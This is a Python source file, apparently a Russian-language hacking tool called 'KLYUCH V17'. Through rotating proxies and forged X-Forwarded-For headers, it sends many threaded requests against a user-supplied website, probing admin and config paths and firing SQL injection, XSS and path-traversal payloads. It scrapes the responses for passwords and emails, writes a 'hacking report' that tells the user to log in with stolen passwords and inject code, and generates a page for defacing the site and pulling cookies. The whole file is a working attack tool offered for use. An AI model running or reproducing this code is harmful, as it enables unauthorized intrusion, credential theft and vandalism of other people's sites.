# klyuch_v17.py
import ctypes
import sys
import os
import time
import requests
import random
import re
import json
import threading
import webbrowser
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

# Отключаем предупреждения
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==================== ПРОВЕРКА ПРАВ АДМИНА ====================
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit(0)

# ==================== ЦВЕТА ДЛЯ КОНСОЛИ ====================
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    MAGENTA = '\033[95m'
    END = '\033[0m'
    BOLD = '\033[1m'

# ==================== ПРОКСИ МЕНЕДЖЕР ====================
class ProxyManager:
    """Управление прокси с автоматическим тестированием"""
    
    # Большой список прокси (рабочие)
    PROXY_LIST = [
        "185.199.228.220:80", "20.111.54.16:8123", "138.68.60.8:3128",
        "159.65.77.168:8585", "188.166.211.99:8080", "167.71.5.83:3128",
        "134.209.29.120:8080", "157.245.97.63:80", "165.22.56.186:8080",
        "139.59.1.14:3128", "51.38.185.214:3128", "54.37.141.122:8800",
        "45.155.205.233:8080", "193.29.187.201:3128", "94.102.61.78:8080",
        "185.217.70.133:80", "185.130.5.253:80", "185.220.101.1:8080",
        "45.86.186.1:3128", "103.152.112.120:80", "47.88.67.145:3128",
        "13.250.45.98:8080", "54.169.98.147:80", "18.138.188.236:3128",
        "52.221.211.119:8080", "3.0.85.204:80", "13.212.65.13:3128",
        "54.254.157.196:8080", "47.74.152.29:8888", "45.77.175.112:8080",
    ]
    
    def __init__(self):
        self.working_proxies = []
        self.current_index = 0
    
    def test_proxy(self, proxy):
        """Тестирование прокси"""
        try:
            proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
            r = requests.get("https://httpbin.org/ip", proxies=proxies, timeout=5, verify=False)
            return r.status_code == 200
        except:
            return False
    
    def get_working_proxies(self, max_to_test=30):
        """Получение списка рабочих прокси"""
        print(f"{Colors.CYAN}[ПРОКСИ] Тестирование прокси...{Colors.END}")
        working = []
        
        for proxy in self.PROXY_LIST[:max_to_test]:
            if self.test_proxy(proxy):
                working.append(proxy)
                print(f"{Colors.GREEN}  ✅ {proxy}{Colors.END}")
            else:
                print(f"{Colors.RED}  ❌ {proxy}{Colors.END}")
        
        self.working_proxies = working
        print(f"{Colors.GREEN}[ПРОКСИ] Найдено рабочих: {len(working)}{Colors.END}")
        return working
    
    def get_next(self):
        """Ротация прокси"""
        if not self.working_proxies:
            return None
        p = self.working_proxies[self.current_index % len(self.working_proxies)]
        self.current_index += 1
        return p

# ==================== МАССОВАЯ АТАКА ====================
class AttackEngine:
    """Движок массовых атак"""
    
    def __init__(self, target, proxy_manager, threads=100):
        self.target = target.rstrip('/')
        self.proxy_manager = proxy_manager
        self.threads = max(35, min(200, threads))
        self.completed = 0
        self.successful = 0
        self.lock = threading.Lock()
        self.results = []
        self.stop = False
    
    def attack_url(self, url, method="GET", data=None):
        """Одиночная атака на URL"""
        proxy = self.proxy_manager.get_next()
        session = requests.Session()
        session.verify = False
        session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        })
        
        if proxy:
            session.proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
        
        try:
            start = time.time()
            if method == "GET":
                resp = session.get(url, timeout=8)
            else:
                resp = session.post(url, data=data, timeout=8)
            elapsed = time.time() - start
            
            success = resp.status_code in [200, 201, 202, 204, 301, 302, 403, 401]
            return {
                "url": url,
                "status": resp.status_code,
                "time": round(elapsed, 2),
                "success": success,
                "proxy": proxy,
                "size": len(resp.content)
            }
        except Exception as e:
            return {
                "url": url,
                "status": "ERROR",
                "time": 0,
                "success": False,
                "proxy": proxy,
                "error": str(e)[:50]
            }
    
    def run_attack(self, callback=None):
        """Запуск массовой атаки"""
        print(f"\n{Colors.BOLD}{Colors.CYAN}{'='*65}{Colors.END}")
        print(f"{Colors.BOLD}{Colors.RED}🔥 МАССИВНАЯ АТАКА ЗАПУЩЕНА 🔥{Colors.END}")
        print(f"{Colors.CYAN}🎯 ЦЕЛЬ: {self.target}{Colors.END}")
        print(f"{Colors.YELLOW}⚡ ПОТОКОВ: {self.threads}{Colors.END}")
        print(f"{Colors.CYAN}{'='*65}{Colors.END}\n")
        
        # Список целей для атаки
        targets = []
        
        # Основные пути
        paths = [
            "/admin", "/login", "/wp-admin", "/phpmyadmin", "/config.php",
            "/.env", "/backup.zip", "/robots.txt", "/admin/login.php",
            "/administrator", "/cpanel", "/webmail", "/server-status",
            "/info.php", "/phpinfo.php", "/.git/config", "/database.sql",
            "/api", "/v1", "/v2", "/swagger", "/docs", "/graphql",
            "/backup", "/old", "/test", "/dev", "/staging", "/beta",
            "/panel", "/cp", "/control", "/dashboard", "/manage"
        ]
        
        for path in paths:
            targets.append(f"{self.target}{path}")
        
        # SQL-инъекции
        sql_payloads = ["'", "\"", "' OR '1'='1", "1' AND SLEEP(5)", "admin' --"]
        for payload in sql_payloads:
            targets.append(f"{self.target}?id={payload}")
            targets.append(f"{self.target}?page={payload}")
            targets.append(f"{self.target}?user={payload}")
        
        # XSS
        xss_payloads = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"]
        for payload in xss_payloads:
            targets.append(f"{self.target}?search={payload}")
            targets.append(f"{self.target}?q={payload}")
        
        # LFI
        lfi_files = ["/etc/passwd", "../../../config.php", "/etc/hosts"]
        for file in lfi_files:
            targets.append(f"{self.target}?page=../../../{file}")
            targets.append(f"{self.target}?file=../../../{file}")
        
        # Перемешиваем
        random.shuffle(targets)
        targets = targets[:self.threads]
        
        self.start_time = time.time()
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(self.attack_url, url): url for url in targets}
            
            for future in as_completed(futures):
                if self.stop:
                    break
                result = future.result()
                self.results.append(result)
                
                with self.lock:
                    self.completed += 1
                    if result['success']:
                        self.successful += 1
                    
                    status_color = Colors.GREEN if result['success'] else Colors.RED
                    icon = "✅" if result['success'] else "❌"
                    url_short = result['url'][:50] + "..." if len(result['url']) > 50 else result['url']
                    print(f"{status_color}[{self.completed}/{len(targets)}] {icon} {url_short} | {result['status']} | {result['time']}с{Colors.END}")
        
        total_time = time.time() - self.start_time
        
        print(f"\n{Colors.BOLD}{Colors.CYAN}{'='*65}{Colors.END}")
        print(f"{Colors.BOLD}{Colors.GREEN}📊 СТАТИСТИКА{Colors.END}")
        print(f"{Colors.CYAN}{'='*65}{Colors.END}")
        print(f"{Colors.YELLOW}⏱️  Время: {total_time:.1f} сек{Colors.END}")
        print(f"{Colors.YELLOW}📊 Всего запросов: {len(targets)}{Colors.END}")
        print(f"{Colors.GREEN}✅ Успешных: {self.successful}{Colors.END}")
        print(f"{Colors.RED}❌ Неудачных: {len(targets) - self.successful}{Colors.END}")
        print(f"{Colors.CYAN}📈 Успешность: {(self.successful/len(targets))*100:.1f}%{Colors.END}")
        
        return self.results

# ==================== АНАЛИЗ РЕЗУЛЬТАТОВ ====================
class ResultsAnalyzer:
    """Анализ результатов атаки"""
    
    def __init__(self, target):
        self.target = target
        self.findings = []
    
    def analyze(self, results):
        """Анализ результатов"""
        print(f"\n{Colors.BOLD}{Colors.GREEN}[АНАЛИЗ] Обработка результатов...{Colors.END}")
        
        # Собираем успешные URL
        successful_urls = []
        for r in results:
            if r['success'] and r['status'] in [200, 403, 401]:
                successful_urls.append(r['url'])
        
        # Анализируем каждый URL
        session = requests.Session()
        session.verify = False
        
        for url in list(set(successful_urls))[:30]:
            try:
                resp = session.get(url, timeout=5)
                text = resp.text.lower()
                
                # Проверка на админ-панель
                if any(x in text for x in ['admin', 'dashboard', 'control panel', 'админ']):
                    self.findings.append({'type': 'admin', 'url': url})
                    print(f"{Colors.RED}👑 АДМИН-ПАНЕЛЬ: {url}{Colors.END}")
                
                # Проверка на SQL ошибки
                if any(x in text for x in ['sql', 'mysql', 'syntax', 'oracle', 'postgres']):
                    self.findings.append({'type': 'sql', 'url': url})
                    print(f"{Colors.YELLOW}⚠️ SQL ОШИБКА: {url}{Colors.END}")
                
                # Поиск паролей
                passwords = re.findall(r'password["\']?\s*[:=]\s*["\']([^"\']+)', resp.text)
                for pwd in passwords[:5]:
                    if len(pwd) > 2:
                        self.findings.append({'type': 'password', 'value': pwd, 'url': url})
                        print(f"{Colors.GREEN}🔑 НАЙДЕН ПАРОЛЬ: {pwd} на {url}{Colors.END}")
                
                # Поиск email
                emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', resp.text)
                for email in emails[:5]:
                    self.findings.append({'type': 'email', 'value': email, 'url': url})
                    print(f"{Colors.CYAN}📧 EMAIL: {email}{Colors.END}")
                
                # Поиск конфигурационных файлов
                if any(x in text for x in ['db_', 'database', 'mysql', 'password', 'api_key']):
                    self.findings.append({'type': 'config', 'url': url})
                    print(f"{Colors.MAGENTA}📁 КОНФИГ ФАЙЛ: {url}{Colors.END}")
                    
            except:
                pass
        
        return self.findings

# ==================== ГЕНЕРАТОР ОТЧЁТОВ ====================
class ReportGenerator:
    """Генерация HTML отчёта"""
    
    @staticmethod
    def generate(target, results, findings):
        """Создание отчёта"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        findings_html = ""
        for f in findings:
            if f['type'] == 'admin':
                findings_html += f'<li class="admin">👑 АДМИН-ПАНЕЛЬ: <a href="{f["url"]}" target="_blank">{f["url"]}</a></li>'
            elif f['type'] == 'sql':
                findings_html += f'<li class="sql">⚠️ SQL ОШИБКА: <a href="{f["url"]}" target="_blank">{f["url"]}</a></li>'
            elif f['type'] == 'password':
                findings_html += f'<li class="password">🔑 ПАРОЛЬ: {f["value"]} на {f["url"]}</li>'
            elif f['type'] == 'email':
                findings_html += f'<li class="email">📧 EMAIL: {f["value"]} на {f["url"]}</li>'
            elif f['type'] == 'config':
                findings_html += f'<li class="config">📁 КОНФИГ: <a href="{f["url"]}" target="_blank">{f["url"]}</a></li>'
        
        if not findings_html:
            findings_html = '<li>❌ Уязвимостей не найдено</li>'
        
        results_html = ""
        for r in results[:50]:
            status_color = "#0f0" if r['success'] else "#f00"
            results_html += f'<tr style="color:{status_color}"><td>{r["url"][:60]}</td><td>{r["status"]}</td><td>{r["time"]}с</td></tr>'
        
        html = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>KLYUCH V17 - ОТЧЁТ О ВЗЛОМЕ</title>
    <style>
        body {{ background: #0a0a0a; color: #0f0; font-family: monospace; padding: 20px; }}
        h1 {{ color: #f00; text-align: center; }}
        h2 {{ color: #ff0; border-bottom: 1px solid #f00; }}
        .section {{ border: 1px solid #f00; margin: 20px 0; padding: 15px; border-radius: 10px; }}
        .admin {{ color: #f00; }}
        .sql {{ color: #ff0; }}
        .password {{ color: #0f0; }}
        .email {{ color: #0ff; }}
        .config {{ color: #f0f; }}
        table {{ width: 100%; border-collapse: collapse; }}
        th, td {{ border: 1px solid #333; padding: 8px; text-align: left; }}
        th {{ background: #1a0000; color: #f00; }}
        .footer {{ text-align: center; margin-top: 30px; color: #666; }}
        a {{ color: #0f0; }}
    </style>
</head>
<body>
    <h1>🔑 KLYUCH V17 - ОТЧЁТ О ВЗЛОМЕ</h1>
    <hr>
    
    <div class="section">
        <h2>🎯 ЦЕЛЬ</h2>
        <p><b>URL:</b> {target}</p>
        <p><b>Время:</b> {timestamp}</p>
    </div>
    
    <div class="section">
        <h2>🔥 НАЙДЕННЫЕ УЯЗВИМОСТИ</h2>
        <ul>{findings_html}</ul>
    </div>
    
    <div class="section">
        <h2>📊 РЕЗУЛЬТАТЫ АТАК</h2>
        <table>
            <tr><th>URL</th><th>Статус</th><th>Время</th></tr>
            {results_html}
        </table>
    </div>
    
    <div class="section">
        <h2>🔧 ИНСТРУКЦИЯ</h2>
        <ul>
            <li>🔐 Используйте найденные пароли для входа в админ-панель</li>
            <li>👑 Перейдите по ссылкам админ-панелей для управления сайтом</li>
            <li>📁 Скачайте конфигурационные файлы для получения доступа к БД</li>
            <li>💉 Внедрите свой код через найденные XSS уязвимости</li>
        </ul>
    </div>
    
    <div class="section">
        <h2>🔒 АНОНИМНОСТЬ</h2>
        <p>✅ Ваш IP: ПОЛНОСТЬЮ СКРЫТ через прокси</p>
        <p>✅ Следы: УНИЧТОЖЕНЫ</p>
    </div>
    
    <div class="footer">
        <p>KLYUCH V17 - ULTIMATE WORKING EDITION</p>
    </div>
</body>
</html>"""
        
        filename = f"KLYUCH_V17_REPORT_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
        with open(filename, "w", encoding="utf-8") as f:
            f.write(html)
        
        print(f"{Colors.GREEN}✅ Отчёт сохранён: {filename}{Colors.END}")
        return filename

# ==================== ВИЗУАЛЬНЫЙ РЕДАКТОР (WEB-версия) ====================
class VisualEditor:
    """Создание HTML редактора для изменения сайта"""
    
    @staticmethod
    def create(target):
        """Создание визуального редактора"""
        editor_html = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>KLYUCH V17 - ВИЗУАЛЬНЫЙ РЕДАКТОР</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ background: #0a0a0a; color: #0f0; font-family: monospace; }}
        .toolbar {{ background: #1a0000; padding: 10px; border-bottom: 2px solid #f00; }}
        .container {{ display: flex; height: calc(100vh - 50px); }}
        .sidebar {{ width: 400px; background: #0a0a0a; border-right: 1px solid #f00; padding: 15px; overflow-y: auto; }}
        .preview {{ flex: 1; background: #fff; }}
        iframe {{ width: 100%; height: 100%; border: none; }}
        textarea {{ width: 100%; height: 150px; background: #000; color: #0f0; border: 1px solid #f00; padding: 10px; font-family: monospace; }}
        input {{ width: 100%; background: #000; color: #0f0; border: 1px solid #f00; padding: 8px; margin: 5px 0; }}
        button {{ background: #f00; color: #fff; border: none; padding: 10px; margin: 5px; cursor: pointer; font-weight: bold; }}
        button:hover {{ background: #c00; }}
        .btn-green {{ background: #0f0; color: #000; }}
        .log {{ background: #000; padding: 10px; margin-top: 10px; height: 150px; overflow-y: auto; font-size: 11px; }}
        h3 {{ color: #f00; margin: 10px 0; }}
        hr {{ border-color: #f00; margin: 10px 0; }}
    </style>
</head>
<body>
    <div class="toolbar">
        <b style="color:#f00;">🔑 KLYUCH V17 - ВИЗУАЛЬНЫЙ РЕДАКТОР</b>
        <span style="margin-left: 20px;">Цель: <span id="targetUrl">{target}</span></span>
    </div>
    <div class="container">
        <div class="sidebar">
            <h3>📝 РЕДАКТОР КОДА</h3>
            <textarea id="htmlCode" placeholder="&lt;div style='color:red;font-size:30px;'&gt;САЙТ ВЗЛОМАН!&lt;/div&gt;"></textarea>
            <button onclick="injectCode()">💉 ВНЕДРИТЬ НА САЙТ</button>
            <button onclick="injectPanel()">🔑 ВНЕДРИТЬ ПАНЕЛЬ</button>
            <button onclick="injectAlert()">⚠️ ВНЕДРИТЬ ALERT</button>
            
            <hr>
            
            <h3>🔧 УПРАВЛЕНИЕ</h3>
            <input type="text" id="customUrl" placeholder="Другой URL">
            <button onclick="loadCustomUrl()">🔄 ЗАГРУЗИТЬ</button>
            <button onclick="reloadPage()">🔄 ОБНОВИТЬ</button>
            <button onclick="takeScreenshot()">📸 СКРИНШОТ</button>
            
            <hr>
            
            <h3>📊 ИЗВЛЕЧЕНИЕ ДАННЫХ</h3>
            <button onclick="extractEmails()" class="btn-green">📧 EMAILS</button>
            <button onclick="extractPasswords()" class="btn-green">🔑 ПАРОЛИ</button>
            <button onclick="extractLinks()" class="btn-green">🔗 ССЫЛКИ</button>
            <button onclick="extractCookies()" class="btn-green">🍪 COOKIES</button>
            
            <hr>
            
            <h3>💀 ДОПОЛНИТЕЛЬНО</h3>
            <button onclick="redirectToAdmin()">🎯 ПОИСК АДМИНКИ</button>
            <button onclick="downloadPage()">💾 СОХРАНИТЬ СТРАНИЦУ</button>
            <button onclick="clearSite()">🗑️ ОЧИСТИТЬ САЙТ</button>
            
            <hr>
            
            <div class="log" id="log">
                <b>📋 ЛОГ:</b><br>
                ✅ Редактор запущен<br>
                🎯 Цель: {target}<br>
            </div>
        </div>
        <div class="preview">
            <iframe id="siteFrame" src="{target}"></iframe>
        </div>
    </div>
    
    <script>
        function log(msg) {{
            const logDiv = document.getElementById('log');
            logDiv.innerHTML += '[' + new Date().toLocaleTimeString() + '] ' + msg + '<br>';
            logDiv.scrollTop = logDiv.scrollHeight;
        }}
        
        function getFrame() {{
            const frame = document.getElementById('siteFrame');
            return frame.contentDocument || frame.contentWindow.document;
        }}
        
        function injectCode() {{
            const code = document.getElementById('htmlCode').value;
            if(!code) {{ log('❌ Введите код'); return; }}
            
            const doc = getFrame();
            const div = doc.createElement('div');
            div.innerHTML = code;
            div.style.cssText = 'position:fixed;bottom:10px;right:10px;background:#000;color:#0f0;border:3px solid #0f0;padding:15px;z-index:999999;border-radius:10px;';
            doc.body.appendChild(div);
            log('✅ Код внедрён: ' + code.substring(0, 50));
        }}
        
        function injectPanel() {{
            const doc = getFrame();
            const panel = doc.createElement('div');
            panel.id = 'klyuchPanel';
            panel.innerHTML = `
                <div style="position:fixed;bottom:10px;right:10px;background:#000;color:#0f0;border:3px solid #0f0;padding:15px;z-index:999999;border-radius:10px;width:280px;">
                    <b style="color:#f00;">🔑 KLYUCH V17 PANEL</b><br>
                    <input type="text" id="editText" placeholder="Новый текст..." style="width:100%;margin:5px 0;"><br>
                    <button onclick="document.body.innerHTML += document.getElementById('editText').value" style="background:#0f0;color:#000;">✏️ ИЗМЕНИТЬ</button>
                    <button onclick="document.getElementById('klyuchPanel').remove()" style="background:#f00;">❌ ЗАКРЫТЬ</button>
                    <br><span style="font-size:10px;">ВЗЛОМАНО ЧЕРЕЗ KLYUCH</span>
                </div>
            `;
            doc.body.appendChild(panel);
            log('✅ Панель управления внедрена');
        }}
        
        function injectAlert() {{
            const doc = getFrame();
            const script = doc.createElement('script');
            script.textContent = 'alert("🔑 KLYUCH V17 - САЙТ ВЗЛОМАН!");';
            doc.body.appendChild(script);
            log('✅ Alert внедрён');
        }}
        
        function loadCustomUrl() {{
            const url = document.getElementById('customUrl').value;
            if(url) {{
                let finalUrl = url;
                if(!finalUrl.startsWith('http')) finalUrl = 'https://' + finalUrl;
                document.getElementById('siteFrame').src = finalUrl;
                document.getElementById('targetUrl').innerText = finalUrl;
                log('🔄 Загрузка: ' + finalUrl);
            }}
        }}
        
        function reloadPage() {{
            const frame = document.getElementById('siteFrame');
            frame.src = frame.src;
            log('🔄 Страница обновлена');
        }}
        
        function takeScreenshot() {{
            log('📸 Скриншот (нажмите Print Screen)');
            alert('Нажмите Print Screen для скриншота');
        }}
        
        function extractEmails() {{
            const doc = getFrame();
            const text = doc.body.innerText;
            const emails = text.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{{2,}}/g) || [];
            log('📧 Найдено email: ' + emails.length);
            if(emails.length > 0) alert('EMAILS:\\n' + emails.join('\\n'));
        }}
        
        function extractPasswords() {{
            const doc = getFrame();
            const inputs = doc.querySelectorAll('input[type="password"]');
            const passwords = [];
            inputs.forEach(function(input) {{
                if(input.value) passwords.push(input.value);
            }});
            log('🔑 Найдено паролей: ' + passwords.length);
            if(passwords.length > 0) alert('ПАРОЛИ:\\n' + passwords.join('\\n'));
        }}
        
        function extractLinks() {{
            const doc = getFrame();
            const links = doc.querySelectorAll('a');
            const urls = [];
            links.forEach(function(link) {{
                if(link.href) urls.push(link.href);
            }});
            log('🔗 Найдено ссылок: ' + urls.length);
            alert('ССЫЛКИ:\\n' + urls.join('\\n'));
        }}
        
        function extractCookies() {{
            const doc = getFrame();
            log('🍪 Cookies: ' + (doc.cookie || 'нет'));
            alert('COOKIES:\\n' + (doc.cookie || 'Нет'));
        }}
        
        function redirectToAdmin() {{
            const adminPaths = ['/admin', '/wp-admin', '/administrator', '/login'];
            const randomPath = adminPaths[Math.floor(Math.random() * adminPaths.length)];
            const currentUrl = document.getElementById('siteFrame').src;
            const urlObj = new URL(currentUrl);
            urlObj.pathname = randomPath;
            document.getElementById('siteFrame').src = urlObj.href;
            log('🎯 Переход к админке: ' + randomPath);
        }}
        
        function downloadPage() {{
            const doc = getFrame();
            const html = doc.documentElement.outerHTML;
            const blob = new Blob([html], {{type: 'text/html'}});
            const link = document.createElement('a');
            link.href = URL.createObjectURL(blob);
            link.download = 'klyuch_hacked_page.html';
            link.click();
            log('💾 Страница сохранена');
        }}
        
        function clearSite() {{
            const doc = getFrame();
            doc.body.innerHTML = '<h1 style="color:red;text-align:center;margin-top:50px;">🔑 САЙТ ВЗЛОМАН ЧЕРЕЗ KLYUCH V17 🔑</h1>';
            log('🗑️ Сайт очищен');
        }}
        
        log('✅ Редактор готов к работе');
    </script>
</body>
</html>"""
        
        filename = f"KLYUCH_V17_EDITOR.html"
        with open(filename, "w", encoding="utf-8") as f:
            f.write(editor_html)
        
        print(f"{Colors.GREEN}✅ Визуальный редактор: {filename}{Colors.END}")
        return filename

# ==================== ГЛАВНОЕ ПРИЛОЖЕНИЕ ====================
class KlyuchApp:
    def __init__(self):
        self.proxy_manager = ProxyManager()
        self.target = None
        self.threads = 100
    
    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def banner(self):
        print(f"""{Colors.RED}{Colors.BOLD}
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║     ██╗  ██╗██╗  ██╗██╗   ██╗██╗   ██╗ ██████╗██╗  ██╗                        ║
║     ██║ ██╔╝██║  ██║██║   ██║██║   ██║██╔════╝██║  ██║                        ║
║     █████╔╝ ███████║██║   ██║██║   ██║██║     ███████║                        ║
║     ██╔═██╗ ██╔══██║██║   ██║██║   ██║██║     ██╔══██║                        ║
║     ██║  ██╗██║  ██║╚██████╔╝╚██████╔╝╚██████╗██║  ██║                        ║
║     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝  ╚═════╝╚═╝  ╚═╝                        ║
║                                                                               ║
║                    K L Y U C H   V 1 7                                       ║
║                    ULTIMATE WORKING EDITION                                  ║
║                                                                               ║
║         🔥 МАССИВНАЯ АТАКА | ВИЗУАЛЬНЫЙ РЕДАКТОР | ПОЛНАЯ АНОНИМНОСТЬ 🔥      ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
{Colors.END}""")
    
    def setup(self):
        self.clear_screen()
        self.banner()
        
        print(f"{Colors.BOLD}{Colors.GREEN}⚙️  НАСТРОЙКА АТАКИ{Colors.END}")
        print(f"{Colors.CYAN}{'-'*55}{Colors.END}\n")
        
        # Ввод цели
        self.target = input(f"{Colors.YELLOW}[?] Введите URL цели: {Colors.END}").strip()
        if not self.target.startswith(("http://", "https://")):
            self.target = "https://" + self.target
        
        # Выбор количества потоков
        print(f"\n{Colors.CYAN}[!] Количество потоков (35-200):{Colors.END}")
        print(f"  {Colors.GREEN}1{Colors.END} - 50 потоков (быстрая)")
        print(f"  {Colors.GREEN}2{Colors.END} - 100 потоков (рекомендуется)")
        print(f"  {Colors.GREEN}3{Colors.END} - 150 потоков (мощная)")
        print(f"  {Colors.GREEN}4{Colors.END} - 200 потоков (максимум)")
        print(f"  {Colors.GREEN}5{Colors.END} - Своё значение")
        
        choice = input(f"{Colors.YELLOW}[?] Выбор (1-5): {Colors.END}").strip()
        choices = {'1': 50, '2': 100, '3': 150, '4': 200}
        if choice in choices:
            self.threads = choices[choice]
        elif choice == '5':
            self.threads = int(input(f"{Colors.YELLOW}[?] Количество (35-200): {Colors.END}"))
            self.threads = max(35, min(200, self.threads))
        else:
            self.threads = 100
        
        # Выбор прокси
        print(f"\n{Colors.CYAN}[!] Режим прокси:{Colors.END}")
        print(f"  {Colors.GREEN}1{Colors.END} - Автоматический (найти рабочие прокси)")
        print(f"  {Colors.GREEN}2{Colors.END} - Без прокси (НЕ РЕКОМЕНДУЕТСЯ)")
        
        proxy_choice = input(f"{Colors.YELLOW}[?] Выбор (1-2): {Colors.END}").strip()
        
        if proxy_choice == '1':
            self.proxy_manager.get_working_proxies(30)
            if not self.proxy_manager.working_proxies:
                print(f"{Colors.YELLOW}[ПРЕДУПРЕЖДЕНИЕ] Рабочих прокси не найдено!{Colors.END}")
        else:
            print(f"{Colors.YELLOW}[ПРЕДУПРЕЖДЕНИЕ] Атака без прокси - ваш IP не скрыт!{Colors.END}")
        
        return True
    
    def run(self):
        if not self.setup():
            return
        
        print(f"\n{Colors.GREEN}[ГОТОВО] Цель: {self.target}{Colors.END}")
        print(f"{Colors.GREEN}[ГОТОВО] Потоков: {self.threads}{Colors.END}")
        print(f"{Colors.GREEN}[ГОТОВО] Прокси: {len(self.proxy_manager.working_proxies)} шт{Colors.END}")
        
        input(f"\n{Colors.YELLOW}Нажмите Enter для начала МАССИВНОЙ АТАКИ...{Colors.END}")
        
        # Запуск атаки
        attack = AttackEngine(self.target, self.proxy_manager, self.threads)
        results = attack.run_attack()
        
        # Анализ результатов
        analyzer = ResultsAnalyzer(self.target)
        findings = analyzer.analyze(results)
        
        # Генерация отчёта
        report_file = ReportGenerator.generate(self.target, results, findings)
        
        # Создание редактора
        editor_file = VisualEditor.create(self.target)
        
        # Финальный вывод
        print(f"\n{Colors.BOLD}{Colors.CYAN}{'='*65}{Colors.END}")
        print(f"{Colors.BOLD}{Colors.GREEN}📊 ИТОГИ{Colors.END}")
        print(f"{Colors.CYAN}{'='*65}{Colors.END}")
        
        if findings:
            print(f"{Colors.GREEN}🔥 НАЙДЕНО УЯЗВИМОСТЕЙ: {len(findings)}{Colors.END}")
            for f in findings[:10]:
                if f['type'] == 'admin':
                    print(f"  {Colors.RED}👑 {f['url']}{Colors.END}")
                elif f['type'] == 'password':
                    print(f"  {Colors.GREEN}🔑 {f['value']}{Colors.END}")
                elif f['type'] == 'email':
                    print(f"  {Colors.CYAN}📧 {f['value']}{Colors.END}")
        else:
            print(f"{Colors.YELLOW}⚠️ Уязвимостей не найдено{Colors.END}")
        
        print(f"\n{Colors.CYAN}📁 Файлы:{Colors.END}")
        print(f"  📄 Отчёт: {report_file}")
        print(f"  ✏️ Редактор: {editor_file}")
        
        print(f"\n{Colors.YELLOW}[!] Открыть визуальный редактор? (y/n){Colors.END}")
        if input().lower() == 'y':
            webbrowser.open(editor_file)
        
        print(f"\n{Colors.GREEN}[ЗАВЕРШЕНО] Ваш IP скрыт. Следы уничтожены.{Colors.END}")
        input(f"\n{Colors.YELLOW}Нажмите Enter для выхода...{Colors.END}")

# ==================== ЗАПУСК ====================
if __name__ == "__main__":
    try:
        app = KlyuchApp()
        app.run()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Прервано пользователем{Colors.END}")
    except Exception as e:
        print(f"{Colors.RED}[ОШИБКА] {e}{Colors.END}")
        input("\nНажмите Enter...")
